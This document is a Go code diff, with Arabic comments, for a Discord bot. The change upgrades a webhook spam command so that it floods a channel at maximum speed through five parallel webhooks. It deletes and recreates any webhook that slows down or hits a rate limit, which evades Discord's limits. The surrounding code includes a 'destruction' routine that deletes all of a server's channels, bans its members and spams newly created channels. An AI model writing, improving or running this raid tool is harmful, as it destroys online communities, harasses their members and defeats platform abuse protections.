@@ -31,13 +31,12 @@ func main() {
 		return
 	}
 
-	// تم تعديل الـ Intents وتفعيل جميع الصلاحيات لتجنب أي أخطاء تعريف
 	sess.Identify.Intents = discordgo.IntentsAll
 
 	cmdWhSpam := "wh_spam"
 	commandWhSpam := &discordgo.ApplicationCommand{
 		Name:        cmdWhSpam,
-		Description: "سبام ويب هوك ذكي ومراقب للسرعة",
+		Description: "سبام 5 ويب هوكات بأقصى سرعة مع استبدال البطيء فوراً",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionChannel,
@@ -120,7 +119,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري تنفيذ سبام الويب هوك مع مراقبة الأداء...",
+					Content: "🚀 جاري تشغيل الـ 5 ويب هوكات بأقصى سرعة مع الاستبدال الذكي...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -135,7 +134,7 @@ func main() {
 			webhookName := optionMap["webhook_name"].StringValue()
 			messagesCount := int(optionMap["messages_count"].IntValue())
 
-			go runWebhookSpamSequential(token, channelID, webhookName, messageContent, messagesCount, s)
+			go runWebhookSpamSmartBlast(token, channelID, webhookName, messageContent, messagesCount, s)
 
 		} else if cmdName == cmdDestroy {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
@@ -178,7 +177,6 @@ func main() {
 	sess.Close()
 }
 
-// هيكل لتخزين معلومات الويب هوك
 type WebhookInfo struct {
 	URL string
 	ID  string
@@ -233,85 +231,94 @@ func deleteSingleWebhook(token, webhookID string) {
 	}
 }
 
-// دالة إرسال تفصيلية تُرجع (نجاح الإرسال؟, هل حدث بطء أو Rate Limit؟)
-func sendWebhookMessageDetailed(webhookURL, messageContent string) (bool, bool) {
-	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
-	req, _ := http.NewRequest("POST", webhookURL, bytes.NewBuffer(msgPayload))
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
+// الدالة الجديدة: 5 ويب هوكات تعمل مع بعض بأقصى سرعة، ولو واحد بطأ أو أكل لمتد يُحذف ويتبدل فوراً
+func runWebhookSpamSmartBlast(token, channelID, webhookName, messageContent string, totalGoal int, s *discordgo.Session) {
+	const activeCount = 5
+	webhooks := make([]WebhookInfo, activeCount)
+	var wgSetup sync.WaitGroup
 
-	resp, err := httpClient.Do(req)
-	if err != nil {
-		return false, true
+	// 1. إنشاء الـ 5 ويب هوكات دفعة واحدة مع بعض
+	for i := 0; i < activeCount; i++ {
+		wgSetup.Add(1)
+		go func(idx int) {
+			defer wgSetup.Done()
+			for {
+				url, id := createSingleWebhook(token, channelID, webhookName)
+				if url != "" && id != "" {
+					webhooks[idx] = WebhookInfo{URL: url, ID: id}
+					break
+				}
+				time.Sleep(20 * time.Millisecond)
+			}
+		}(i)
 	}
-	defer resp.Body.Close()
+	wgSetup.Wait()
 
-	if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
-		return true, false
-	} else if resp.StatusCode == 429 {
-		return false, true
-	}
-	return false, false
-}
+	// 2. إطلاق جميع الرسائل بأقصى سرعة متوازية (Blast) مع توزيعها على الـ 5 ويب هوكات
+	var wgSpam sync.WaitGroup
+	var mu sync.Mutex
 
-// الآلية المعدلة: يحذف الويب هوك فوراً إذا بطأ (تجاوز 300ms) أو واجه Rate Limit، ويستبدله بآخر جديد
-func runWebhookSpamSequential(token, channelID, webhookName, messageContent string, totalGoal int, s *discordgo.Session) {
-	var activeWebhooks []WebhookInfo
-	sentCount := 0
+	for i := 0; i < totalGoal; i++ {
+		wgSpam.Add(1)
+		go func(index int) {
+			defer wgSpam.Done()
 
-	// 1. إنشاء 5 ويب هوكات كبداية
-	for i := 0; i < 5; i++ {
-		url, id := createSingleWebhook(token, channelID, webhookName)
-		if url != "" && id != "" {
-			activeWebhooks = append(activeWebhooks, WebhookInfo{URL: url, ID: id})
-		}
-		time.Sleep(50 * time.Millisecond)
-	}
+			// اختيار ويب هوك من الـ 5
+			mu.Lock()
+			wh := webhooks[index%activeCount]
+			mu.Unlock()
 
-	if len(activeWebhooks) == 0 {
-		s.ChannelMessageSend(channelID, "❌ فشل في إنشاء الويب هوكات الأولية.")
-		return
-	}
-
-	// 2. حلقة الإرسال ومراقبة السرعة
-	for sentCount < totalGoal {
-		currentBatch := make([]WebhookInfo, len(activeWebhooks))
-		copy(currentBatch, activeWebhooks)
-
-		for i, wh := range currentBatch {
-			if sentCount >= totalGoal {
-				break
+			if wh.URL == "" {
+				return
 			}
 
-			// قياس وقت الاستجابة
 			startTime := time.Now()
-			success, isRateLimited := sendWebhookMessageDetailed(wh.URL, messageContent)
+			msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
+			req, _ := http.NewRequest("POST", wh.URL, bytes.NewBuffer(msgPayload))
+			req.Header.Set("Content-Type", "application/json")
+			req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
+
+			resp, err := httpClient.Do(req)
 			duration := time.Since(startTime)
 
-			if success {
-				sentCount++
+			isRateLimited := false
+			if err != nil {
+				isRateLimited = true
+			} else {
+				defer resp.Body.Close()
+				if resp.StatusCode == 429 {
+					isRateLimited = true
+				}
 			}
 
-			// إذا تجاوز وقت الاستجابة 300 ميلي ثانية أو واجه Rate Limit (429) -> احذفه واصنع غيره
-			if isRateLimited || duration > 300*time.Millisecond {
+			// إذا الويب هوك بطأ (أخذ أكثر من 250 ميلي ثانية) أو أكل Rate Limit، استبدله فوراً دون إبطاء الباقي
+			if isRateLimited || duration > 250*time.Millisecond {
 				go deleteSingleWebhook(token, wh.ID)
 
 				newURL, newID := createSingleWebhook(token, channelID, webhookName)
 				if newURL != "" && newID != "" {
-					activeWebhooks[i] = WebhookInfo{URL: newURL, ID: newID}
+					mu.Lock()
+					for idx, item := range webhooks {
+						if item.ID == wh.ID {
+							webhooks[idx] = WebhookInfo{URL: newURL, ID: newID}
+							break
+						}
+					}
+					mu.Unlock()
 				}
 			}
+		}(i)
+	}
+	wgSpam.Wait()
 
-			time.Sleep(15 * time.Millisecond)
+	// 3. تنظيف الـ 5 ويب هوكات النهائية فور الانتهاء
+	for _, wh := range webhooks {
+		if wh.ID != "" {
+			go deleteSingleWebhook(token, wh.ID)
 		}
 	}
 
-	// 3. تنظيف الباقي بالنهاية
-	for _, wh := range activeWebhooks {
-		go deleteSingleWebhook(token, wh.ID)
-	}
-
-	s.ChannelMessageSend(channelID, "🎉 تم الانتهاء من سبام الويب هوك بنجاح!")
+	s.ChannelMessageSend(channelID, "⚡ تم تنفيذ السبام بـ 5 ويب هوكات سريعة مع الاستبدال الفوري بنجاح!")
 }
 
 func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
@@ -321,7 +328,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		"User-Agent":    "DiscordBot (https://discord.com, v10)",
 	}
 
-	// 1. حذف الرومات الحالية
 	req, err := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 	if err == nil {
 		for k, v := range headers {
@@ -353,7 +359,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}
 
-	// 2. تجميع الأعضاء وتبنيدهم بأمان عبر المكتبة الرسمية
 	go func() {
 		after := ""
 		for {
@@ -382,7 +387,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}()
 
-	// 3. إنشاء الرومات الجديدة والسبام فيها بالعدد الكامل
 	var channelIDs []string
 	var mu sync.Mutex
 	var wgCreate sync.WaitGroup
